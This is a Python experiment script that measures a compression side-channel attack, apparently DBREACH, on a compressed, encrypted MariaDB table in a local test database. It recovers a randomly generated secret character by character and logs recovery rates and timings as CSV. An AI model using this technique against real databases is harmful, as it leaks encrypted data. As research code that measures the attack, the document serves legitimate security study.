import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl
import k_of_n_attacker
import random
import string
import statistics
import time
from collections import defaultdict
import sys

compression_alg = sys.argv[1].replace("--", "")
shift = int(sys.argv[2].replace("--shift=", ""))

maxRowSize = 200

control = utils.MariaDBController("testdb")

table = "victimtable"

prefix_lens_to_try = [14]
amplification_rounds_to_try = [30]
str_lens_to_try = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19]
str_lens_to_try = str_lens_to_try[shift:] + str_lens_to_try[:shift]
print("prefix_length,str_length,fully_recovered,pct_recovered,time_per_char,time_per_round")
for amp_rounds in amplification_rounds_to_try:
    for prefix_len in prefix_lens_to_try:
        for trial in range(10):
            for str_len in str_lens_to_try:
                known_prefix = ''.join(random.choices(string.ascii_lowercase, k=prefix_len))
                rest_of_str = ''.join(random.choices(string.ascii_lowercase, k=str_len))
                #print(known_prefix + " + " + rest_of_str)
                secret = known_prefix + rest_of_str
                control.drop_table(table)
                time.sleep(1)
                control.create_basic_table(table,
                    varchar_len=maxRowSize,
                    compressed=True,
                    encrypted=True)
                control.insert_row(table, 0, secret)
                dbreacher = dbreacher_impl.DBREACHerImpl(control, table, 1, maxRowSize, string.printable.replace(string.ascii_lowercase, '').replace('*', ''), ord('*'))

                attacker = k_of_n_attacker.kOfNAttacker(len(string.ascii_lowercase), dbreacher, [], True)

                bytes_recovered = 0
                startTime = time.time()
                num_rounds = 0
                while bytes_recovered < str_len:
                    possibilities = []
                    for c in string.ascii_lowercase:
                        possibilities.append(known_prefix + c)
                    correct_char = secret[len(known_prefix)]
                    attacker.guesses = possibilities
                    scores = defaultdict(lambda: 0)
                    i = 0
                    while i < amp_rounds:
                        success = attacker.setUp()
                        if not success:
                            continue
                        success = attacker.tryAllGuesses(verbose = False)
                        if not success:
                            continue
                        winners = attacker.getTopKGuesses()
                        winners_by_bytes_to_shrink = [(round(1/s), g) for (s, g) in winners]
                        top_score = winners_by_bytes_to_shrink[0][0]
                        normalized = [(b - top_score, g[-1]) for (b, g) in winners_by_bytes_to_shrink]
                        #print(normalized)
                        if compression_alg == "zlib":
                            for (b, c) in normalized:
                                scores[c] += b
                        else:
                            # outlier scoring system
                            scores[normalized[0][1]] += (normalized[0][0] - normalized[1][0])
                            scores[normalized[-1][1]] += (normalized[-2][0] - normalized[-1][0])
                
                        leaderboard = [(b, c) for (c, b) in scores.items()]
                        leaderboard.sort()

                        # get position of correct char
                        scores_to_chars = dict()
                        for b, c in leaderboard:
                            if b in scores_to_chars:
                                scores_to_chars[b].add(c)
                            else:
                                scores_to_chars[b] = set([c])

                        keys = [b for (b, l) in scores_to_chars.items()]
                        keys.sort()
                        place = 0
                        points_behind = 0
                        points_ahead = 0
                        for idx, key in enumerate(keys):
                            if correct_char not in scores_to_chars[key]:
                                place += len(scores_to_chars[key])
                            if correct_char in scores_to_chars[key]:
                                position = statistics.mean([place + 1 + i for i in range(len(scores_to_chars[key]))])
                                place = position
                                points_behind = key - keys[0]
                                points_ahead = 0
                                if idx < len(keys) - 1 and len(scores_to_chars[key]) == 1:
                                    points_ahead = keys[idx + 1] - key
                                break
                        #print("__"+str(prefix_len) + ","+str(i)+","+str(1 if place == 1 else 0)+","+str(place)+","+str(points_behind)+","+str(points_ahead) + "," + str(keys[1] - keys[0]))

                        i += 1
                        num_rounds += 1

                    leaderboard = [(b, c) for (c, b) in scores.items()]
                    leaderboard.sort()
                    winner = leaderboard[0][1]
                    #print("")
                    #print("Chose " + winner)
                    #print(leaderboard)
                    #print("")
                    if winner == correct_char:
                        bytes_recovered += 1
                        known_prefix += winner
                    else:
                        break
                endTime = time.time()
                recovered = 1 if bytes_recovered == str_len else 0
                print(str(prefix_len)+","+str(str_len)+","+str(recovered)+","+str(bytes_recovered / str_len)+","+str((endTime-startTime) / (bytes_recovered + (1 - recovered)))+","+str((endTime-startTime)/ ((bytes_recovered + (1 - recovered)) * 30)))


